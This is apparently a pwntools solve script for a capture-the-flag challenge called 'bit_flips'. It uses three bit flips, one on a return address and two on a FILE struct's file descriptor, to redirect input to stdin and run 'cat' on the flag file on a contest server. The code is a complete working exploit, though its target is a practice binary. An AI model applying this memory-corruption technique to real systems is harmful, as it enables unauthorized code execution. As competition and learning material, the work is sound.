#!/usr/bin/env python3
"""
bit_flips - SOLVE (250pts)

Strategy: 3 bit flips
1. Flip bit 3 of ret addr -> vuln() returns to cmd+1 (0x1422 -> 0x142a, skip push rbp to align stack)
2. Flip bit 0 of fd in FILE struct -> fd: 3(0b11) -> 2(0b10)
3. Flip bit 1 of fd in FILE struct -> fd: 2(0b10) -> 0(0b00) = stdin!

cmd() now reads from stdin instead of ./commands -> send "cat flag"

Key: the remote uses glibc 2.39 (system Ubuntu 24.04), NOT the provided libc 2.42.
Offset FILE* from sbrk: 0x20d60 (glibc 2.39) vs 0x20cf0 (glibc 2.42)
"""
from pwn import *
import time

context.binary = elf = ELF('./bitflips_files/main', checksec=False)

if args.REMOTE:
    p = remote('chall.0xfun.org', 39580)
else:
    p = process(elf.path)

p.recvuntil(b"generous today\n")
main_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
system_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
address_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
sbrk_addr = int(p.recvline().decode().strip().split('= ')[1], 16)

pie_base = main_addr - elf.symbols['main']
ret_addr_loc = address_addr + 0x18

# glibc 2.39 (Ubuntu 24.04 system): offset = 0x20d60
# glibc 2.42 (provided):            offset = 0x20cf0
OFFSET = 0x20d60 if args.REMOTE else 0x20cf0
file_ptr = sbrk_addr - OFFSET
fd_addr = file_ptr + 0x70  # _fileno in FILE struct @ +0x70

log.info(f"PIE:      {hex(pie_base)}")
log.info(f"sbrk:     {hex(sbrk_addr)}")
log.info(f"FILE*:    {hex(file_ptr)}")
log.info(f"fd addr:  {hex(fd_addr)}")
log.info(f"ret addr: {hex(ret_addr_loc)}")

# Flip 1: bit 3 at ret_addr -> 0x22 -> 0x2a (cmd+1)
p.recvuntil(b"> ")
p.sendline(f"{ret_addr_loc:x}".encode())
p.sendline(b"3")
log.info("Flip 1: ret -> cmd+1")

# Flip 2: bit 0 at fd -> 3(0b11) -> 2(0b10)
p.recvuntil(b"> ")
p.sendline(f"{fd_addr:x}".encode())
p.sendline(b"0")
log.info("Flip 2: fd bit 0 (3->2)")

# Flip 3: bit 1 at fd -> 2(0b10) -> 0(0b00) = stdin
p.recvuntil(b"> ")
p.sendline(f"{fd_addr:x}".encode())
p.sendline(b"1")
log.info("Flip 3: fd bit 1 (2->0=stdin)")

log.success("cmd() reads from stdin now!")
time.sleep(0.3)
p.sendline(b"cat /srv/app/flag")
time.sleep(0.3)

data = p.recvall(timeout=5)
log.success(f"Output:\n{data.decode(errors='replace')}")
p.close()
